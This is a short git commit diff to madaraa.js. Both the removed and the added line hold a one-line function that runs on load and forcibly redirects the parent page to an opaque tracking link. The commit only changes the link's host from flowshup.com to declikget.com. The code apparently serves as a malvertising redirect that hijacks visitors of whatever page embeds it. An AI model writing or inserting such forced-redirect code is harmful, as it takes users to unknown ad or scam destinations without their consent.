2c7b2b6ca7553ca95887ced6f150b6c77d539a6b
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2026-09-12 09:42:56 +0700

    Update madaraa.js

--- madaraa.js
+++ madaraa.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://dbcadbi.flowshup.com/s/ff0b14aaebc4c?sub1=Madara&track=Madara"; } LoadAd();
+function LoadAd() { parent.location.href="https://dbcadbi.declikget.com/s/ff0b14aaebc4c?sub1=Madara&track=Madara"; } LoadAd();
